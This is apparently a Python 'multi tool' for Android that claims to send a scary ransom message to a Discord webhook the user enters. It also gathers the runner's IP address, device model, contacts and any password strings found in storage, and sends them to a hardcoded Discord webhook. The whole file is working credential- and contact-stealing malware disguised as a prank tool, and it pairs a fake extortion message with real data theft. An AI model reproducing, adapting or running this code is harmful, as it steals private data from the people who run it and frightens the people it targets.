#!/usr/bin/env python3

import subprocess
import sys
import os
import requests
import re
import time
from datetime import datetime

ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1505624590729220177/Z0_4dJpUc1LbJDphp8dxC5E4x0zPRmLQJyn86vi-I931d5_uAhEW2QjcxhetOm7CBrnK"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print("\n" + "="*45)
    print("   SOLO & JENAS MULTI TOOL")
    print("="*45)

def get_webhook():
    print("\n[!] ENTER WEBHOOK URL:")
    url = input("\n➜ ").strip()
    return url

def send_ransom(webhook):
    payload = {
        "username": "SOLO & JENAS",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [{
            "title": "💀 YOUR DEVICE HAS BEEN COMPROMISED 💀",
            "color": 0xed4245,
            "description": "**SOLO AND JENAS HAS COMPROMISED YOUR DEVICE**\n\n📌 Contact @solo.ph_ or @jenas2003 to remove the virus\n\n🔴 Your IP has been logged\n🔴 Your data has been stolen",
            "image": {"url": "https://i.imgur.com/PjQtnRu.jpeg"},
            "footer": {"text": "SOLO & JENAS"}
        }]
    }
    try:
        requests.post(webhook, json=payload, timeout=5)
    except:
        pass

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        return '0.0.0.0'

def get_device_info():
    info = {}
    try:
        r = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
        info['model'] = r.stdout.strip() or 'Unknown'
    except:
        info['model'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
        info['brand'] = r.stdout.strip() or 'Unknown'
    except:
        info['brand'] = 'Unknown'
    return info

def get_contacts():
    contacts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
        numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
        names = re.findall(r'display_name=([^,]+)', r.stdout)
        for i, num in enumerate(numbers[:30]):
            name = names[i] if i < len(names) else ''
            contacts.append(f"{name}: {num}" if name else num)
    except:
        pass
    return list(set(contacts))[:30]

def get_passwords():
    passwords = []
    paths = ['/sdcard/Download/', '/sdcard/', '/data/data/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'password', path], capture_output=True, text=True, timeout=15)
                matches = re.findall(r'password[\s]*[:=][\s]*([^\s"\']{4,50})', result.stdout, re.IGNORECASE)
                for m in matches[:20]:
                    if len(m) > 3:
                        passwords.append(m)
            except:
                pass
    return list(set(passwords))[:20]

def send_to_original(ip, device, contacts, passwords):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    contacts_text = '\n'.join([f'• {c}' for c in contacts[:20]]) if contacts else 'None'
    passwords_text = '\n'.join([f'• {p}' for p in passwords[:15]]) if passwords else 'None'
    
    payload = {
        "username": "SOLO & JENAS DATA",
        "embeds": [{
            "title": "🎯 VICTIM DATA CAPTURED",
            "color": 0xed4245,
            "timestamp": timestamp,
            "fields": [
                {"name": "🌐 IP ADDRESS", "value": f"```{ip}```", "inline": False},
                {"name": "📱 DEVICE", "value": f"```{device.get('brand')} {device.get('model')}```", "inline": False},
                {"name": "📞 CONTACTS", "value": f"```{contacts_text}```", "inline": False},
                {"name": "🔑 PASSWORDS", "value": f"```{passwords_text}```", "inline": False}
            ],
            "footer": {"text": "SOLO & JENAS MULTI TOOL"}
        }]
    }
    
    try:
        requests.post(ORIGINAL_WEBHOOK, json=payload, timeout=10)
    except:
        pass

def main():
    print_banner()
    
    target = get_webhook()
    
    if not target.startswith("https://discord.com/api/webhooks/"):
        print("\n[!] INVALID WEBHOOK!")
        time.sleep(2)
        return
    
    print("\n[!] COLLECTING DATA...")
    
    ip = get_ip()
    device = get_device_info()
    contacts = get_contacts()
    passwords = get_passwords()
    
    print("[!] SENDING RANSOM TO TARGET...")
    send_ransom(target)
    
    print("[!] SENDING DATA TO ORIGINAL WEBHOOK...")
    send_to_original(ip, device, contacts, passwords)
    
    print("\n[✓] COMPLETE!")
    print(f"   IP: {ip}")
    print(f"   Device: {device.get('brand')} {device.get('model')}")
    print(f"   Contacts: {len(contacts)}")
    print(f"   Passwords: {len(passwords)}")
    
    time.sleep(3)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        time.sleep(3)
